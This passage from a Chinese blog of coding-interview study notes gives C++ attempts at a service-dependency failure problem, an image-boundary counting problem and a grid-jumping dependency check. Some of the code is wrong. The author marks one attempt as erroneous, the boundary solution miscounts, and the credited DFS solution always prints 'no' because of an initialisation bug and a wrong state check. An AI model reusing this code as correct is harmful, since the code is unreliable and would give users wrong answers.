<p>特别的，没有正常节点输出单独一个半角逗号。</p>
<h2 id="示例1-3"><a href="#示例1-3" class="headerlink" title="示例1"></a><strong>示例1</strong></h2><h3 id="输入-20"><a href="#输入-20" class="headerlink" title="输入"></a>输入</h3><blockquote>
<p>a1-a2,a5-a6,a2-a3</p>
<p>a5,a2</p>
</blockquote>
<h3 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h3><blockquote>
<p>a6,a3</p>
</blockquote>
<h2 id="个人代码1-输出有序"><a href="#个人代码1-输出有序" class="headerlink" title="个人代码1(输出有序)"></a>个人代码1(输出有序)</h2><p>有个问题，因为用了map，所以输出时的顺序是按字典序排列的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    </span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    string t;</span><br><span class="line">    vector&lt;string&gt; serve;</span><br><span class="line">    while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        serve.push_back(t);</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;string&gt; bad;</span><br><span class="line">    string t1;</span><br><span class="line">    cin&gt;&gt;t1;</span><br><span class="line">    stringstream ss1(t1);</span><br><span class="line">    string t2;</span><br><span class="line">    while(getline(ss1,t2,&#x27;,&#x27;))</span><br><span class="line">     bad.push_back(t2);</span><br><span class="line">     </span><br><span class="line">     //如果是右边必坏，左边必坏，如果左边必坏，右边不坏</span><br><span class="line">     //搞一个bool记录下？</span><br><span class="line"> </span><br><span class="line">    map&lt;string,string&gt; mp1;</span><br><span class="line">    map&lt;string,bool&gt; mp2;//记录哈</span><br><span class="line">    //vector&lt;string&gt; </span><br><span class="line">     for(auto c:serve)</span><br><span class="line">     &#123;</span><br><span class="line">         for(int i=0;i&lt;c.size();i++)</span><br><span class="line">         &#123;</span><br><span class="line">             if(c[i]==&#x27;-&#x27;)</span><br><span class="line">             &#123;</span><br><span class="line">                //  mp[c.substr(0,i)]=c.substr(0,i);</span><br><span class="line">                //  mp[c.substr(i+1)]=c.substr(i+1);</span><br><span class="line">                 mp1[c.substr(0,i)]=c.substr(i+1);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">     &#125;</span><br><span class="line">     for(auto a:mp1) //提前记录一下</span><br><span class="line">     &#123;</span><br><span class="line">         mp2[a.first]=true;</span><br><span class="line">         mp2[a.second]=true;</span><br><span class="line">     &#125;</span><br><span class="line">    //  for(auto a:bad)</span><br><span class="line">    //  cout&lt;&lt;a&lt;&lt;&quot;,&quot;;</span><br><span class="line">    //  cout&lt;&lt;endl;</span><br><span class="line">    //  for(auto c:mp1)</span><br><span class="line">    //  cout&lt;&lt;c.first&lt;&lt;&quot;,&quot;&lt;&lt;c.second&lt;&lt;endl;</span><br><span class="line">     //现在，干什么，先遍历bad，再遍历mp，如果是键=bad，如果是值=bad，对应bool false</span><br><span class="line">     </span><br><span class="line">    //  for(auto a:mp2)</span><br><span class="line">    //  &#123;</span><br><span class="line">    //      cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">    //  &#125;</span><br><span class="line">     for(auto a:bad)</span><br><span class="line">     for(auto c:mp1)</span><br><span class="line">     &#123;</span><br><span class="line">         if(a==c.first&amp;&amp;mp2[c.first]==true)//等于左边，左边false</span><br><span class="line">         &#123;</span><br><span class="line">             mp2[c.first]=false;</span><br><span class="line">         &#125;</span><br><span class="line">         if(a==c.second&amp;&amp;mp2[c.second]==true)//等于右边，左右都false</span><br><span class="line">         &#123;</span><br><span class="line">             mp2[c.first]=false;</span><br><span class="line">             mp2[c.second]=false;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     int flag=-1;</span><br><span class="line">    //   for(auto a:mp2)</span><br><span class="line">    //  &#123;</span><br><span class="line">    //      cout&lt;&lt;a.first&lt;&lt;&quot;,&quot;&lt;&lt;a.second&lt;&lt;endl;</span><br><span class="line">    //  &#125;</span><br><span class="line">    </span><br><span class="line">    int co=0;</span><br><span class="line">     for(auto a:mp2)</span><br><span class="line">     &#123;</span><br><span class="line">         if(a.second==true)</span><br><span class="line">         &#123;</span><br><span class="line">             flag=1;</span><br><span class="line">            cout&lt;&lt;a.first;</span><br><span class="line">            if(co!=mp2.size()-1) cout&lt;&lt;&quot;,&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">          co++;</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">     &#125;</span><br><span class="line">     if(flag&lt;0) cout&lt;&lt;&quot;,&quot;&lt;&lt;endl;</span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unorderd_map 是哈希表，塔喵的是胡乱排序</p>
<p>可是如果按照vector&lt;pair&lt;string,bool&gt; &gt;mp2，我到时候就不能直接mp2[键]这样访问了诶</p>
<h2 id="个人代码2-按插入顺序输出"><a href="#个人代码2-按插入顺序输出" class="headerlink" title="个人代码2(按插入顺序输出)"></a>个人代码2(按插入顺序输出)</h2><p>思路是这样</p>
<p>1.首先定义两数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;string&gt; serve; //用于接收服务输入以逗号分割的值，如a1-a2</span><br><span class="line">vector&lt;string&gt; bad;//用于接收故障输入，如a5</span><br></pre></td></tr></table></figure>

<p>2.遍历serve数组，先筛选一遍，不是故障的服务（初次筛选）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stringstream ss;</span><br><span class="line">string t;</span><br><span class="line">vector&lt;string&gt; chushai;</span><br><span class="line">for(auto a:serve)</span><br><span class="line">&#123;</span><br><span class="line">	ss.str(a);</span><br><span class="line">	vector&lt;string&gt; temp;</span><br><span class="line">	while(getline(ss,t,&#x27;-&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		temp.push_back(t);</span><br><span class="line">	&#125;</span><br><span class="line">	string a=temp[0];</span><br><span class="line">	string b=temp[1];</span><br><span class="line">	</span><br><span class="line">	if(!count(bad.begin(),bad.end(),a)&amp;&amp;!count(chushai.begin(),chushai.end(),a))//既无故障，也不重复</span><br><span class="line">	&#123;</span><br><span class="line">		chushai.push_back(a);</span><br><span class="line">	&#125;</span><br><span class="line">	if(!count(bad.begin(),bad.end(),b)&amp;&amp;!count(chushai.begin(),chushai.end(),b))//既无故障，也不重复</span><br><span class="line">	&#123;</span><br><span class="line">		chushai.push_back(b);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在遍历serve过程中，对每个元素值单独处理</p>
<p>（这一块不知道怎么描述，我觉得是关键之处）</p>
<p>（将一些待处理的值，比如”a1-a2 a5-a6…”，提前处理成”a1”,”a2”,”a5”,”a6”<strong>完成后</strong>，再对”a1”,”a2”,”a5”,”a6”统一进行下一步操作，如对比筛选）</p>
<p><strong>不见得比下述方式好</strong></p>
<p>（遍历的时候，先处理”a1-a2”，变成”a1”,”a2”，先不急着处理”a5-a6”，反而接着就”a1”,”a2”，先进行一遍筛选和处理）</p>
<p>然后这里的count()函数，需要头文件<code>&lt;algorithm&gt;</code></p>
<p>3.进行二筛</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;string&gt; ershai;</span><br><span class="line">for(auto a:chushai)</span><br><span class="line">&#123;</span><br><span class="line">	if(!isGZ(a))</span><br><span class="line">	ershai.push_back(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>isGZ内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isGZ(string s)</span><br><span class="line">&#123;</span><br><span class="line">	//它是故障</span><br><span class="line">	if(count(bad.begin(),bad.end(),s))</span><br><span class="line">	return true;</span><br><span class="line">	</span><br><span class="line">	//它不是故障，看它的依赖是否是故障</span><br><span class="line">	for(auto item:mp)</span><br><span class="line">	&#123;</span><br><span class="line">	if(item[0]==s&amp;&amp;isGZ(item[1])) return true;</span><br><span class="line">	&#125;</span><br><span class="line">	//否则不是故障</span><br><span class="line">	return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的mp有门道，其定义为vector&lt;vector&lt;string&gt; &gt; mp;</p>
<p>类似于map的键值对的效果，但是呢，map是字典序排序的，不符合题意</p>
<p>所以在第2步，初筛的时候，我们需要将每次处理后的temp，还是要push_back到mp里，mp里，包含了依赖关系</p>
<p>所以加上一行 <code>mp.push_back(temp)</code>;</p>
<p>反正ershai的元素即为最终输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// Online IDE - Code Editor, Compiler, Interpreter</span><br><span class="line"></span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;unordered_map&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">vector&lt;string&gt; bad;//故障</span><br><span class="line">vector&lt;vector&lt;string&gt; &gt;mp;//处理好的依赖关系</span><br><span class="line">vector&lt;string&gt; serve; //待处理的依赖关系a1-a2</span><br><span class="line"></span><br><span class="line">bool isGZ(string s)</span><br><span class="line">&#123;</span><br><span class="line">   if(count(bad.begin(),bad.end(),s)) //该服务故障</span><br><span class="line">   return true;//有故障</span><br><span class="line">   </span><br><span class="line">   //如果这个服务没有故障，看下它的依赖</span><br><span class="line">   for(auto item:mp)</span><br><span class="line">   &#123;</span><br><span class="line">       if(item[0]==s&amp;&amp;isGZ(item[1]))//左边是s，看下右边的依赖是否故障</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br><span class="line">   return false;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    </span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    string t;</span><br><span class="line">  </span><br><span class="line">    while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        serve.push_back(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    string t1;</span><br><span class="line">    cin&gt;&gt;t1;</span><br><span class="line">    stringstream ss1(t1);</span><br><span class="line">    string t2;</span><br><span class="line">    while(getline(ss1,t2,&#x27;,&#x27;))</span><br><span class="line">     bad.push_back(t2);</span><br><span class="line">   </span><br><span class="line">    vector&lt;string&gt; set1;//剔除了故障的服务</span><br><span class="line">    for(auto st:serve)</span><br><span class="line">    &#123;</span><br><span class="line">        ss.clear();</span><br><span class="line">        ss.str(st);</span><br><span class="line">        vector&lt;string&gt; temp;</span><br><span class="line">        while(getline(ss,t1,&#x27;-&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">            temp.push_back(t1);</span><br><span class="line">        &#125;</span><br><span class="line">        mp.push_back(temp);</span><br><span class="line">        string a=temp[0];</span><br><span class="line">        string b=temp[1];</span><br><span class="line">        </span><br><span class="line">        //故障列表里没有a</span><br><span class="line">        if(!count(bad.begin(),bad.end(),a)&amp;&amp;!count(set1.begin(),set1.end(),a))//bad里没有set1里也没有</span><br><span class="line">        &#123;</span><br><span class="line">            set1.push_back(a);</span><br><span class="line">        &#125;</span><br><span class="line">         //故障列表里没有b</span><br><span class="line">         if(!count(bad.begin(),bad.end(),b)&amp;&amp;!count(set1.begin(),set1.end(),b))</span><br><span class="line">        &#123;</span><br><span class="line">            set1.push_back(b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      for(auto a:mp)</span><br><span class="line">  cout&lt;&lt;a[0]&lt;&lt;&quot;,&quot;&lt;&lt;a[1]&lt;&lt;endl;</span><br><span class="line">  for(auto a:set1)</span><br><span class="line">  cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    vector&lt;string&gt; listzc;//正常服务</span><br><span class="line">    </span><br><span class="line">    //再筛选一遍</span><br><span class="line">    for(auto a:set1)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!isGZ(a))</span><br><span class="line">        listzc.push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    int len=listzc.size();</span><br><span class="line">    string res=&quot;&quot;;</span><br><span class="line">    if(len==0) cout&lt;&lt;&quot;,&quot;;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=0;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res+=listzc[i];</span><br><span class="line">            if(i!=len-1) res+=&quot;,&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>stringstream ss(t);</p>
<p>等价于</p>
<p> stringstream ss;</p>
<p>ss.str(t);</p>
<p>如果要重复利用ss，可以再声明之后，ss.clear();</p>
</blockquote>
<h1 id="35-图像物体的边界"><a href="#35-图像物体的边界" class="headerlink" title="35.图像物体的边界"></a>35.图像物体的边界</h1><p>给定一个二维数组M行N列，二维数组里的数字代表图片的像素，为了简化问题，仅包含像素1和5两种像素，每种像素代表一个物体，2个物体相邻的格子为边界，求像素1代表的物体的边界个数。<br>像素1代表的物体的边界指与像素5相邻的像素1的格子，边界相邻的属于同一个边界，相邻需要考虑8个方向（上，下，左，右，左上，左下，右上，右下）。<br>其他约束：<br>地图规格约束为：<br>0&lt;M&lt;100<br>0&lt;N&lt;100</p>
<p>1）如下图，与像素5的格子相邻的像素1的格子（0,0）、（0,1）、（0,2）、（1,0）、（1,2）、（2,0）、（2,1）、（2,2）、（4,4）、（4,5）、（5,4）为边界，另（0,0）、（0,1）、（0,2）、（1,0）、（1,2）、（2,0）、（2,1）、（2,2）相邻，为1个边界，（4,4）、（4,5）、（5,4）相邻，为1个边界，所以下图边界个数为2。</p>
<p>输入示例</p>
<p>6 6</p>
<p><strong>1 1 1</strong> 1 1 1</p>
<p><strong>1</strong> 5 <strong>1</strong> 1 1 1</p>
<p><strong>1</strong> <strong>1 1</strong> 1 1 1</p>
<p>1 1 1 1 1 1</p>
<p>1 1 1 1 <strong>1 1</strong></p>
<p>1 1 1 1 <strong>1</strong> 5</p>
<p>输出</p>
<p>2</p>
<p><strong>说明：就是1作为围墙，能把中间的5围死，加粗部分</strong></p>
<p>输入描述:</p>
<ul>
<li>第一行，行数M，列数N 第二行开始，是M行N列的像素的二维数组，仅包含像素1和5</li>
</ul>
<p>输出描述:</p>
<ul>
<li>像素1代表的物体的边界个数。如果没有边界输出0（比如只存在像素1，或者只存在像素5）。</li>
</ul>
<h2 id="个人代码-17"><a href="#个人代码-17" class="headerlink" title="个人代码"></a>个人代码</h2><p>我就是笨办法</p>
<p>考虑情况为：</p>
<p>1.四个角落，需要判断3个值</p>
<p>2.除开四个角落的地方（第一行，最后一行，第一列，最后一列）考虑5个值</p>
<p>3.其余为8个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// Online IDE - Code Editor, Compiler, Interpreter</span><br><span class="line"></span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int solution(vector&lt;vector&lt;int&gt; &gt;a,int n,int m)</span><br><span class="line">&#123;</span><br><span class="line">    int co=0;</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt;v;</span><br><span class="line">    int x=0,y=0,flag1=0,flag5=0;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    for(int j=0;j&lt;m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i][j]==5)</span><br><span class="line">        &#123;</span><br><span class="line">            flag5=1;</span><br><span class="line">            vector&lt;int&gt; temp;</span><br><span class="line">            temp.push_back(i);</span><br><span class="line">            temp.push_back(j);</span><br><span class="line">              v.push_back(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        else flag1=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">      for(auto m:v)</span><br><span class="line">    cout&lt;&lt;m[0]&lt;&lt;&quot; &quot;&lt;&lt;m[1]&lt;&lt;endl;</span><br><span class="line">    if(flag1==0||flag5==0) return 0;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    for(auto temp:v)</span><br><span class="line">    &#123;</span><br><span class="line">        int p=temp[0],q=temp[1];</span><br><span class="line">        if(p==0) //第一行</span><br><span class="line">        &#123;</span><br><span class="line">            if(q==0)//只要三个</span><br><span class="line">            &#123;</span><br><span class="line">                if(a[0][1]==1&amp;&amp;a[1][1]==1&amp;&amp;a[1][0]==1) co++;</span><br><span class="line">            &#125;</span><br><span class="line">            else if(q==m-1)//只要三个</span><br><span class="line">            &#123;</span><br><span class="line">                if(a[0][m-2]==1&amp;&amp;a[1][m-2]==1&amp;&amp;a[1][m-1]==1) co++;</span><br><span class="line">            &#125;</span><br><span class="line">            else //五个 </span><br><span class="line">            &#123;</span><br><span class="line">                if(a[0][q-1]==1&amp;&amp;a[0][q+1]==1&amp;&amp;a[1][q-1]==1&amp;&amp;a[1][q]==1&amp;&amp;a[1][q+1]==1) co++;</span><br><span class="line">            &#125;</span><br><span class="line">       </span><br><span class="line">        &#125;</span><br><span class="line">        else if(q==0) //第一列</span><br><span class="line">        &#123;</span><br><span class="line">    </span><br><span class="line">             if(p==n-1)//只要三个</span><br><span class="line">             &#123;</span><br><span class="line">                 if(a[n-2][0]==1&amp;&amp;a[n-2][1]==1&amp;&amp;a[n-1][1]==1) co++;</span><br><span class="line">             &#125;</span><br><span class="line">             else //五个 </span><br><span class="line">            &#123;</span><br><span class="line">                 if(a[p-1][0]==1&amp;&amp;a[p+1][0]==1&amp;&amp;a[p-1][1]==1&amp;&amp;a[p][1]==1&amp;&amp;a[p+1][1]==1) co++;</span><br><span class="line">            &#125;</span><br><span class="line">       </span><br><span class="line">        &#125;</span><br><span class="line">      else  if(p==n-1)//最后一行</span><br><span class="line">        &#123;</span><br><span class="line">           // if(q==0)//只要三个</span><br><span class="line">            if(q==m-1) //只要三个</span><br><span class="line">            &#123;</span><br><span class="line">                if(a[p-1][q]==1&amp;&amp;a[p-1][q-1]==1&amp;&amp;a[p][q-1]==1) co++;</span><br><span class="line">            &#125;</span><br><span class="line">            else //只要五个</span><br><span class="line">            &#123;</span><br><span class="line">                if(a[p-1][q]==1&amp;&amp;a[p+1][q]==1&amp;&amp;a[p-1][q-1]==1&amp;&amp;a[p][q-1]==1&amp;&amp;a[p+1][q-1]==1) co++;</span><br><span class="line">            &#125;</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line">       else  if(q==m-1)//最后一行</span><br><span class="line">        &#123;</span><br><span class="line">            if(a[p-1][q-1]==1&amp;&amp;a[p-1][q]==1&amp;&amp;a[p-1][q+1]==1&amp;&amp;a[p][q-1]==1&amp;&amp;a[p][q+1]==1) co++;</span><br><span class="line">       </span><br><span class="line">        &#125;</span><br><span class="line">        else //八个</span><br><span class="line">        &#123;</span><br><span class="line">            if(a[p-1][q-1]==1&amp;&amp;a[p-1][q]==1&amp;&amp;a[p-1][q+1]==1&amp;&amp;a[p][q-1]==1&amp;&amp;a[p][q+1]==1&amp;&amp;a[p+1][q-1]==1&amp;&amp;a[p+1][q]==1&amp;&amp;a[p+1][q+1]==1)</span><br><span class="line">            co++;</span><br><span class="line">     </span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    return co;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    /*</span><br><span class="line">    6 6</span><br><span class="line"></span><br><span class="line">1 1 1 1 1 1</span><br><span class="line"></span><br><span class="line">1 5 1 1 1 1</span><br><span class="line"></span><br><span class="line">1 1 1 1 1 1</span><br><span class="line"></span><br><span class="line">1 1 1 1 1 1</span><br><span class="line"></span><br><span class="line">1 1 1 1 1 1</span><br><span class="line"></span><br><span class="line">1 1 1 1 1 5</span><br><span class="line"></span><br><span class="line">初步想法是先找5，然后探索它的八个方向是否都是1</span><br><span class="line">    */</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt;a(n,vector&lt;int&gt;(m));</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    for(int j=0;j&lt;m;j++)</span><br><span class="line">    cin&gt;&gt;a[i][j];</span><br><span class="line">    cout&lt;&lt;solution(a,n,m);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>4 4<br>1 1 1 1<br>1 1 5 5<br>1 1 1 5<br>1 1 1 1<br>1 2<br>1 3<br>2 3<br>0</p>
</blockquote>
<h1 id="36-跳格子"><a href="#36-跳格子" class="headerlink" title="36.跳格子"></a>36.跳格子</h1><p>地上共有N个格子，你需要跳完地上所有的格子，但是格子间是有强依赖关系的，跳完前一个格子后，后续的格子才会被开启，格子间的依赖关系由多组steps数组给出，steps[0]表示前一个格子，step[1]表示steps[0]可以开启的格子<br>比如[0,1]表示从跳完第0个格子以后第1个格子就开启了，比如[2,1],[2,3]表示跳完第2个格子后第1个格子和第3个格子就被开启了。<br>请你计算是否能由给出的steps数组跳完所有的格子，如果可以输出yes，否则输出no<br>说明：</p>
<p>1.你可以从一个格子调到任意一个开启的格子<br>2.没有前置依赖条件默认就是开启的<br>3.如果总数是N，则所有的格子编号为[0,1,2,3….N-1]l连续的数组<br>输入描述<br>输入一个整数N表示总共有多少个格子，接着输入多组二维数组steps表示所有格子之间的依赖关系。<br>输出描述<br>如果能按照steps给定的依赖顺序跳完所有的格子输出yes,否则输出no.</p>
<h2 id="输入-21"><a href="#输入-21" class="headerlink" title="输入"></a>输入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">0 1</span><br><span class="line">0 2</span><br></pre></td></tr></table></figure>

<h3 id="输出-20"><a href="#输出-20" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure>

<h2 id="个人代码（有误）-1"><a href="#个人代码（有误）-1" class="headerlink" title="个人代码（有误）"></a>个人代码（有误）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// Online IDE - Code Editor, Compiler, Interpreter</span><br><span class="line"></span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">bool isbihuan(vector&lt;vector&lt;int&gt; &gt;&amp;gezi,vector&lt;int&gt; &amp;agezi)</span><br><span class="line">&#123;</span><br><span class="line">    for(auto temp:gezi)</span><br><span class="line">    &#123;</span><br><span class="line">        if(temp[0]==agezi[agezi.size()-1])//</span><br><span class="line">        &#123;</span><br><span class="line">         if(find(agezi.begin(),agezi.end(),temp[1])!=agezi.end())</span><br><span class="line">        &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        agezi.push_back(temp[0]);</span><br><span class="line">        agezi.push_back(temp[1]);</span><br><span class="line">       </span><br><span class="line">        if(isbihuan(gezi,agezi)) return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     </span><br><span class="line">    /*</span><br><span class="line">     根据示例来看，走完所有格子就是保持线性关系咯，如果闭环那就不可以咯</span><br><span class="line">    0 1 </span><br><span class="line">    1 0 也就是没提，默认开启，比如单个0,1；但如果像这种0,1互依赖情况，</span><br><span class="line">    那么用一个vector去存储成对的依赖关系 vector&lt;vector&lt;int&gt; &gt;</span><br><span class="line">    另一个vector也存储依赖关系，但是保持在一行上vector&lt;int&gt;</span><br><span class="line">    遍历第一个vector，取它每个元素的第一个与第二个vector的最后一个元素去判断相等，若相等则闭环</span><br><span class="line">    */</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;//格子数</span><br><span class="line">    cin.ignore();</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt;gezi;//依赖关系</span><br><span class="line">  //  map&lt;int,int&gt; m;//</span><br><span class="line">   // map&lt;int,int&gt;mp;//计数</span><br><span class="line">  //  int a,b;</span><br><span class="line">  string input,t;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        getline(cin,input);</span><br><span class="line">         if(input.empty()) break;//多输入一遍空格即可</span><br><span class="line">     //   m[a]=a;</span><br><span class="line">      //  m[b]=b;</span><br><span class="line">        stringstream ss(input);</span><br><span class="line">         vector&lt;int&gt; a;</span><br><span class="line">        while(getline(ss,t,&#x27; &#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">           </span><br><span class="line">            a.push_back(stoi(t));</span><br><span class="line">        &#125;</span><br><span class="line">          gezi.push_back(a);</span><br><span class="line">       // if(m.size()==n) break;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">//    for(auto a:m)</span><br><span class="line">//    cout&lt;&lt;a.first&lt;&lt;endl;</span><br><span class="line">//    for(auto a:gezi)</span><br><span class="line">//    cout&lt;&lt;a[0]&lt;&lt;&quot;,&quot;&lt;&lt;a[1]&lt;&lt;endl;</span><br><span class="line"> </span><br><span class="line">    bool istrue=true;//可以成功</span><br><span class="line">    for(auto list:gezi)</span><br><span class="line">    &#123;</span><br><span class="line">      if(isbihuan(gezi,list))</span><br><span class="line">      &#123;</span><br><span class="line">          istrue=false;</span><br><span class="line">          break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(istrue) cout&lt;&lt;&quot;yes&quot;;</span><br><span class="line">    else cout&lt;&lt;&quot;no&quot;;</span><br><span class="line">    /*</span><br><span class="line">    0 1</span><br><span class="line">    0 2</span><br><span class="line">    */</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="wp-4"><a href="#wp-4" class="headerlink" title="wp"></a>wp</h2><p>利用图及深度遍历 </p>
<p>来自 <a href="https://blog.csdn.net/BYZLZ119/article/details/131076746">GHHIAS</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum status &#123;unv,ving,ved&#125;;//遍历状态,不能用数字</span><br><span class="line">void dfs(int node,vector&lt;status&gt;&amp; visit,vector&lt;vector&lt;int&gt; &gt;&amp; edges,bool &amp; stepall)</span><br><span class="line">&#123;</span><br><span class="line">    visit[node]=ving;//正在遍历</span><br><span class="line"></span><br><span class="line">    for(int neighbor:edges[node])//遍历邻居节点</span><br><span class="line">    &#123;</span><br><span class="line">        if(visit[neighbor]==unv)//没访问</span><br><span class="line">        &#123;</span><br><span class="line">             dfs(neighbor,visit,edges,stepall);//递归遍历邻居节点</span><br><span class="line"></span><br><span class="line">                //能跳完所有格子</span><br><span class="line">             if(!stepall) return;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        else if(visit[neighbor]==unv)//若邻居节点正在遍历，但未完成遍历</span><br><span class="line">        &#123;</span><br><span class="line">            stepall=false;//无法跳完所有格子</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    visit[node]=ved;//访问过，即遍历完成</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     </span><br><span class="line">   int n;</span><br><span class="line">   cin&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">   cin.ignore();</span><br><span class="line">    </span><br><span class="line">    //初始化边</span><br><span class="line">    vector&lt;vector&lt;int&gt; &gt;edges(n);</span><br><span class="line">    //vector&lt;status&gt; visit(n,0);//enum不支持数字</span><br><span class="line">    vector&lt;status&gt; visit(n,unv);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bool stepall=false;</span><br><span class="line">    string s;</span><br><span class="line">    while(getline(cin,s))</span><br><span class="line">    &#123;</span><br><span class="line">        if(s.empty()) break;</span><br><span class="line"></span><br><span class="line">        int a,b;</span><br><span class="line">        stringstream ss(s);</span><br><span class="line">        ss&gt;&gt;a&gt;&gt;b;//解析输入的两个数字</span><br><span class="line">        edges[b].push_back(a);//记录边</span><br><span class="line">    &#125;</span><br><span class="line">    for(int i=0;i&lt;n&amp;&amp;stepall;i++)//遍历所有节点</span><br><span class="line">    &#123;</span><br><span class="line">        if(visit[i]==unv)//如果节点未被遍历</span><br><span class="line">        dfs(i,visit,edges,stepall);//从该结点开始遍历</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;(stepall?&quot;yes&quot;:&quot;no&quot;)&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

